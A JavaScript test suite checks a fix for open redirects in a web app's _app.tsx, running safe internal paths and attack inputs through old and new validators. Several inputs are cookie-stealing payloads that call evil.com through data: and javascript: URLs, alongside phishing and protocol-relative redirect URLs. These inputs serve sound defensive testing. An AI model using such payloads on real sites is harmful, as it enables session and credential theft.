/**
 * Security Test Suite: App-level URL Redirect Validation
 * 
 * Issue: CWE-79, CWE-116, CWE-601 - Open Redirect / URL Redirection to Untrusted Site
 * Severity: Medium
 * Alert: GitHub CodeQL #13
 * File: frontend/src/pages/_app.tsx
 * 
 * Problem:
 * - The '_app.tsx' handles redirects from TWO sources without validation:
 *   1. sessionStorage.getItem('redirect') - can be manipulated by malicious JS
 *   2. URL query parameter ?redirect=... - can be crafted by attacker
 * - Both were used directly in router.replace() without validation
 * - Attackers could redirect users to external phishing sites
 * - Particularly dangerous because _app.tsx runs on EVERY page load
 * 
 * Solution:
 * - Validate BOTH redirect sources before using router.replace()
 * - Only allow relative paths starting with '/' (internal routes)
 * - Block protocol-relative URLs starting with '//' (e.g., //evil.com)
 * - Reject absolute URLs (http://, https://)
 * - Default to '/' if validation fails
 * 
 * Test Strategy:
 * - Test sessionStorage redirect validation
 * - Test URL query parameter redirect validation
 * - Test safe internal redirects (should work)
 * - Test external URL attacks (should block)
 * - Test protocol-relative URL attacks (should block)
 */

console.log('\n🔒 SECURITY TEST: App-level URL Redirect Validation\n');
console.log('='.repeat(79));

// Simulate the validation logic from _app.tsx
function validateRedirect(redirect) {
  // NEW SECURE METHOD: Only allow relative paths starting with '/' but not '//'
  return (typeof redirect === "string" && redirect.startsWith('/') && !redirect.startsWith('//')) ? redirect : '/';
}

function validateRedirectOLD(redirect) {
  // OLD VULNERABLE METHOD: No validation, accepts any string
  return redirect || '/';
}

let testsRun = 0;
let testsPassed = 0;
let testsFailed = 0;

function test(description, testFn) {
  testsRun++;
  try {
    testFn();
    testsPassed++;
    console.log(`✅ PASS: ${description}`);
  } catch (error) {
    testsFailed++;
    console.log(`❌ FAIL: ${description}`);
    console.log(`   Error: ${error.message}`);
  }
}

function assert(condition, message) {
  if (!condition) {
    throw new Error(message || 'Assertion failed');
  }
}

// ============================================================================
// TEST CATEGORY 1: SessionStorage Redirect Validation
// ============================================================================
console.log('\n💾 Category 1: SessionStorage Redirect Validation\n');

test('SessionStorage: Safe redirect to dashboard', () => {
  const stored = '/dashboard';
  const result = validateRedirect(stored);
  assert(result === '/dashboard', `Expected '/dashboard', got '${result}'`);
});

test('SessionStorage: Block external URL', () => {
  const malicious = 'https://phishing-site.com/fake-login';
  const result = validateRedirect(malicious);
  assert(result === '/', `Should default to '/', got '${result}'`);
  
  const vulnerableResult = validateRedirectOLD(malicious);
  assert(vulnerableResult === malicious, 'OLD method should be vulnerable');
  console.log(`   🔴 OLD: Would redirect to ${vulnerableResult} (PHISHING!)`);
  console.log(`   🟢 NEW: Redirects to ${result} (SAFE)`);
});

test('SessionStorage: Block protocol-relative URL', () => {
  const malicious = '//evil.com/steal-session';
  const result = validateRedirect(malicious);
  assert(result === '/', `Should default to '/', got '${result}'`);
  
  const vulnerableResult = validateRedirectOLD(malicious);
  console.log(`   🔴 OLD: Would redirect to ${vulnerableResult} (VULNERABLE!)`);
  console.log(`   🟢 NEW: Redirects to ${result} (SECURE)`);
});

test('SessionStorage: Block javascript: protocol', () => {
  const malicious = 'javascript:alert(document.cookie)';
  const result = validateRedirect(malicious);
  assert(result === '/', `Should default to '/', got '${result}'`);
});

test('SessionStorage: Handle null/undefined', () => {
  const result1 = validateRedirect(null);
  const result2 = validateRedirect(undefined);
  assert(result1 === '/', 'null should default to /');
  assert(result2 === '/', 'undefined should default to /');
});

// ============================================================================
// TEST CATEGORY 2: URL Query Parameter Redirect Validation
// ============================================================================
console.log('\n🔗 Category 2: URL Query Parameter Redirect Validation\n');

test('URL Param: Safe redirect to profile', () => {
  const param = '/profile/settings';
  const result = validateRedirect(param);
  assert(result === '/profile/settings', `Expected '/profile/settings', got '${result}'`);
});

test('URL Param: Block external URL attack', () => {
  const malicious = 'https://attacker.com/collect-credentials';
  const result = validateRedirect(malicious);
  assert(result === '/', `Should default to '/', got '${result}'`);
});

test('URL Param: Block data: URI scheme', () => {
  const malicious = 'data:text/html,<script>fetch("https://evil.com?cookie="+document.cookie)</script>';
  const result = validateRedirect(malicious);
  assert(result === '/', `Should default to '/', got '${result}'`);
});

test('URL Param: Allow deep paths with query strings', () => {
  const safe = '/search?q=security&filter=recent&page=2';
  const result = validateRedirect(safe);
  assert(result === safe, `Should preserve query params, got '${result}'`);
});

test('URL Param: Allow paths with hash fragments', () => {
  const safe = '/docs#security-guidelines';
  const result = validateRedirect(safe);
  assert(result === safe, `Should preserve hash, got '${result}'`);
});

// ============================================================================
// TEST CATEGORY 3: Real-World Attack Scenarios on _app.tsx
// ============================================================================
console.log('\n💀 Category 3: Real-World Attack Scenarios on _app.tsx\n');

test('Attack: Phishing via sessionStorage manipulation', () => {
  // Attacker injects malicious script that sets sessionStorage
  // sessionStorage.setItem('redirect', 'https://fake-ratemyprof.com')
  const malicious = 'https://fake-ratemyprof.com/login';
  const result = validateRedirect(malicious);
  assert(result === '/', 'Should block phishing redirect from sessionStorage');
  
  console.log(`   🔴 Attack: Malicious JS sets sessionStorage to ${malicious}`);
  console.log(`   🔴 OLD: User visits any page → redirected to phishing site`);
  console.log(`   🟢 NEW: Redirect blocked → stays on ${result}`);
});

test('Attack: Phishing via URL parameter', () => {
  // Attacker sends: https://yourdomain.com/?redirect=https://evil.com
  const malicious = 'https://yourdomain.evil.com/fake-dashboard';
  const result = validateRedirect(malicious);
  assert(result === '/', 'Should block phishing redirect from URL param');
  
  console.log(`   🔴 Attack: User clicks /?redirect=${malicious}`);
  console.log(`   🔴 OLD: App loads → auto-redirects to phishing site`);
  console.log(`   🟢 NEW: Redirect blocked → stays on ${result}`);
});

test('Attack: Session hijacking via redirect', () => {
  // Redirect to attacker's site that captures session data
  const malicious = '//attacker.com/capture?ref=https://yourdomain.com/current-page';
  const result = validateRedirect(malicious);
  assert(result === '/', 'Should block session hijacking redirect');
  
  console.log(`   🔴 Attack: Redirect to external site with session info in URL`);
  console.log(`   🟢 NEW: Blocked protocol-relative URL`);
});

test('Attack: XSS via javascript: protocol in redirect', () => {
  const malicious = 'javascript:void(fetch("https://evil.com/steal",{method:"POST",body:document.cookie}))';
  const result = validateRedirect(malicious);
  assert(result === '/', 'Should block javascript: protocol XSS');
  
  console.log(`   🔴 Attack: javascript: protocol would execute arbitrary code`);
  console.log(`   🟢 NEW: Blocked dangerous protocol`);
});

// ============================================================================
// TEST CATEGORY 4: Edge Cases and Encoding Attacks
// ============================================================================
console.log('\n🎭 Category 4: Edge Cases and Encoding Attacks\n');

test('Block URL-encoded external URL', () => {
  const malicious = 'https%3A%2F%2Fevil.com%2Fphishing';
  const result = validateRedirect(malicious);
  assert(result === '/', `Should default to '/', got '${result}'`);
});

test('Block mixed case protocol', () => {
  const malicious = 'HtTpS://evil.com';
  const result = validateRedirect(malicious);
  assert(result === '/', `Should default to '/', got '${result}'`);
});

test('Block backslash path traversal', () => {
  const malicious = '\\\\evil.com\\phishing';
  const result = validateRedirect(malicious);
  assert(result === '/', `Should default to '/', got '${result}'`);
});

test('Handle empty string', () => {
  const result = validateRedirect('');
  assert(result === '/', `Should default to '/', got '${result}'`);
});

test('Handle whitespace-only string', () => {
  const result = validateRedirect('   ');
  assert(result === '/', `Should default to '/', got '${result}'`);
});

// ============================================================================
// TEST CATEGORY 5: GitHub Pages SPA Redirect (Specific Use Case)
// ============================================================================
console.log('\n📄 Category 5: GitHub Pages SPA Redirect (Specific Use Case)\n');

test('GitHub Pages: Valid SPA route from 404', () => {
  // GitHub Pages uses this pattern to handle SPA routing
  const spa_route = '/professors/123e4567-e89b-12d3-a456-426614174000';
  const result = validateRedirect(spa_route);
  assert(result === spa_route, 'Should allow valid SPA route');
});

test('GitHub Pages: Block external redirect from 404', () => {
  // Attacker manipulates sessionStorage before 404 page runs
  const malicious = 'https://evil.com/fake-professor-page';
  const result = validateRedirect(malicious);
  assert(result === '/', 'Should block external URL even from 404 redirect');
  
  console.log(`   🔴 Attack: Manipulate sessionStorage before 404.html runs`);
  console.log(`   🔴 OLD: 404 page saves malicious URL → _app.tsx redirects to it`);
  console.log(`   🟢 NEW: Malicious URL blocked in _app.tsx`);
});

test('GitHub Pages: Multiple path segments', () => {
  const deep_path = '/colleges/abc123/professors/def456/reviews';
  const result = validateRedirect(deep_path);
  assert(result === deep_path, 'Should allow deep SPA paths');
});

// ============================================================================
// TEST CATEGORY 6: Performance Testing
// ============================================================================
console.log('\n⚡ Category 6: Performance Testing\n');

test('Performance: 10,000 validations under 100ms', () => {
  const testCases = [
    '/dashboard',
    'https://evil.com',
    '//attacker.com',
    '/profile/settings',
    'javascript:alert(1)',
    '/search?q=test',
    'data:text/html,<script>',
    '/colleges/123/professors/456',
  ];
  
  const startTime = Date.now();
  for (let i = 0; i < 10000; i++) {
    validateRedirect(testCases[i % testCases.length]);
  }
  const duration = Date.now() - startTime;
  
  assert(duration < 100, `Took ${duration}ms, expected <100ms`);
  console.log(`   ⏱️  10,000 validations completed in ${duration}ms`);
});

// ============================================================================
// RESULTS SUMMARY
// ============================================================================
console.log('\n' + '='.repeat(79));
console.log('📊 TEST RESULTS SUMMARY');
console.log('='.repeat(79));
console.log(`Total tests run: ${testsRun}`);
console.log(`✅ Passed: ${testsPassed}`);
console.log(`❌ Failed: ${testsFailed}`);
console.log(`Success rate: ${((testsPassed/testsRun)*100).toFixed(1)}%`);

if (testsFailed === 0) {
  console.log('\n🎉 ALL TESTS PASSED! App-level URL redirect validation is SECURE! 🔒');
  console.log('\n✅ Security improvements:');
  console.log('   • SessionStorage redirects validated');
  console.log('   • URL query parameter redirects validated');
  console.log('   • External URLs blocked (https://, http://, //)');
  console.log('   • Protocol attacks blocked (javascript:, data:, file:)');
  console.log('   • Phishing redirects prevented app-wide');
  console.log('   • GitHub Pages SPA routing still works');
  console.log('   • Only safe internal redirects allowed');
  console.log('   • Runs on EVERY page load - critical security layer');
  process.exit(0);
} else {
  console.log('\n❌ SOME TESTS FAILED - Security vulnerabilities may exist!');
  process.exit(1);
}
